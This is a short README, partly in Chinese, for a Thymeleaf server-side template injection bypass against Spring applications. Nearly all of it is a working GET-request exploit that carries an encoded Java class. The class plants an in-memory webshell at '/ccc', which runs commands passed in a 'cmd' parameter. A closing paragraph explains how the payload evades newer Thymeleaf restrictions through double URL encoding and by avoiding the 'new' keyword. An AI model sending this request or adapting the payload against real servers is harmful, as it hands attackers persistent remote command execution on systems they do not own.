# ThymeleafSSTIBypass
 Thymeleaf SSTI Bypass
 参考自：
https://www.cnpanda.net/sec/1063.html


1、findit.jar的POC：
GET /doc;/__$%7BT%20(org.springframework.cglib.core.ReflectUtils).defineClass(%27SpringRequestMappingMemshell%27,T%20(org.springframework.util.Base64Utils).decodeFromString(T%20(org.unbescape.uri.UriEscape).unescapeUriPath(%27yv66vgAAADQAqgoADQBVCABWCgBXAFgIAFkLAFoAWwcAXAgAXQsABgBeBwBfCgANAGAIADsHAGEHAGIHAGMHAGQKAAwAZQoADgBmBwBnCAA9BwBoBwBpCgAVAFUIAGoKABUAawcAbAoAFABtCgAZAG4IAG8KAA8AcAoAEgBVCgAOAHEIAHIHAHMIAHQHAHUKAHYAdwoAdgB4CgB5AHoKACMAewgAfAoAIwB9CgAjAH4HAH8JAIAAgQoAKwCCAQAGPGluaXQ%252BAQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAB5MU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbDsBAAhkb0luamVjdAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAHY29udGV4dAEAN0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L1dlYkFwcGxpY2F0aW9uQ29udGV4dDsBABZhYnN0cmFjdEhhbmRsZXJNYXBwaW5nAQBATG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvaGFuZGxlci9BYnN0cmFjdEhhbmRsZXJNYXBwaW5nOwEAFXJlZ2lzdGVySGFuZGxlck1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAOZXhlY3V0ZUNvbW1hbmQBAAtwYXRoUGF0dGVybgEAMkxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi91dGlsL3BhdHRlcm4vUGF0aFBhdHRlcm47AQAYcGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uAQBITG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb247AQAScmVxdWVzdE1hcHBpbmdJbmZvAQA%252FTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAA21zZwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUHAGgHAHMBAD0oTGphdmEvbGFuZy9TdHJpbmc7KUxvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvUmVzcG9uc2VFbnRpdHk7AQADY21kAQAKZXhlY1Jlc3VsdAEACkV4Y2VwdGlvbnMHAIMBACJSdW50aW1lVmlzaWJsZVBhcmFtZXRlckFubm90YXRpb25zAQA2TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0UGFyYW07AQAFdmFsdWUBAApTb3VyY2VGaWxlAQAhU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbC5qYXZhDAAuAC8BAAxpbmplY3Qtc3RhcnQHAIQMAIUAhgEAOW9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLnNlcnZsZXQuRGlzcGF0Y2hlclNlcnZsZXQuQ09OVEVYVAcAhwwAiACJAQA1b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQBABxyZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nDACKAIsBAD5vcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L2hhbmRsZXIvQWJzdHJhY3RIYW5kbGVyTWFwcGluZwwAjACNAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAPW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8MAI4AjwwAkACRAQAcU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbAEAEGphdmEvbGFuZy9TdHJpbmcBADZvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi91dGlsL3BhdHRlcm4vUGF0aFBhdHRlcm5QYXJzZXIBAAQvY2NjDACSAJMBAEZvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uDACUAJUMAC4AlgEAAAwALgCXDACYAJkBAA5pbmplY3Qtc3VjY2VzcwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAxpbmplY3QtZXJyb3IBABFqYXZhL3V0aWwvU2Nhbm5lcgcAmgwAmwCcDACdAJ4HAJ8MAKAAoQwALgCiAQACXEEMAKMApAwApQA2AQAnb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL1Jlc3BvbnNlRW50aXR5BwCmDACnAKgMAC4AqQEAE2phdmEvaW8vSU9FeGNlcHRpb24BADxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdENvbnRleHRIb2xkZXIBABhjdXJyZW50UmVxdWVzdEF0dHJpYnV0ZXMBAD0oKUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdEF0dHJpYnV0ZXM7AQA5b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzAQAMZ2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0kpTGphdmEvbGFuZy9PYmplY3Q7AQAHZ2V0QmVhbgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQANc2V0QWNjZXNzaWJsZQEABChaKVYBAAVwYXJzZQEARihMamF2YS9sYW5nL1N0cmluZzspTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3V0aWwvcGF0dGVybi9QYXRoUGF0dGVybjsBAAd2YWx1ZU9mAQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL1N0cmluZzsBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQIIKExqYXZhL2xhbmcvU3RyaW5nO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGFyYW1zUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL0hlYWRlcnNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vQ29uc3VtZXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUHJvZHVjZXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdENvbmRpdGlvbjspVgEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAjb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXMBAAJPSwEAJUxvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1czsBADooTGphdmEvbGFuZy9PYmplY3Q7TG9yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzOylWACEAEgANAAAAAAADAAEALgAvAAEAMAAAAC8AAQABAAAABSq3AAGxAAAAAgAxAAAABgABAAAAEgAyAAAADAABAAAABQAzADQAAAAJADUANgABADAAAAGCAAoACAAAALISAku4AAMSBAO5AAUDAMAABkwrEge5AAgCAMAACU0stgAKEgsGvQAMWQMSDVNZBBIOU1kFEg9TtgAQTi0EtgAREhISEwS9AAxZAxIUU7YAEDoEuwAVWbcAFhIXtgAYOgW7ABlZBL0AFFkDGQW4ABpTtwAbOga7AA9ZEhwZBgEBAQEBAbcAHToHLSwGvQANWQO7ABJZtwAeU1kEGQRTWQUZB1O2AB9XEiBLpwAHTBIiSyqwAAEAAwCpAKwAIQADADEAAAA%252BAA8AAAAUAAMAGAASABkAHgAaADsAGwBAABwAUgAdAGAAHgB1AB8AiAAgAKYALACpAC8ArAAtAK0ALgCwADAAMgAAAFwACQASAJcANwA4AAEAHgCLADkAOgACADsAbgA7ADwAAwBSAFcAPQA8AAQAYABJAD4APwAFAHUANABAAEEABgCIACEAQgBDAAcArQADAEQARQABAAMArwBGAEcAAABIAAAAEAAC%252FwCsAAEHAEkAAQcASgMAAQA9AEsAAwAwAAAAaAAEAAMAAAAmuwAjWbgAJCu2ACW2ACa3ACcSKLYAKbYAKk27ACtZLLIALLcALbAAAAACADEAAAAKAAIAAAA0ABoANQAyAAAAIAADAAAAJgAzADQAAAAAACYATABHAAEAGgAMAE0ARwACAE4AAAAEAAEATwBQAAAADAEAAQBRAAEAUnMATAABAFMAAAACAFQ%253D%27)),T%20(org.springframework.util.ClassUtils).getDefaultClassLoader()).doInject()%7D__::.x

2、thymeleaf bypass的关键
除了上文提到的部分，还有一个点是payload里不能包含new关键字，所有之前的payload会在新版里报错，原因https://github.com/thymeleaf/thymeleaf/issues/809，所以参考 https://landgrey.me/blog/15/ 中的payload。另外，由于作为URL路径的paylaod里不能包含/，所以采用双重URL编码，在payload里使用 org.unbescape.uri.UriEscape.unescapeUriPath 解一层码
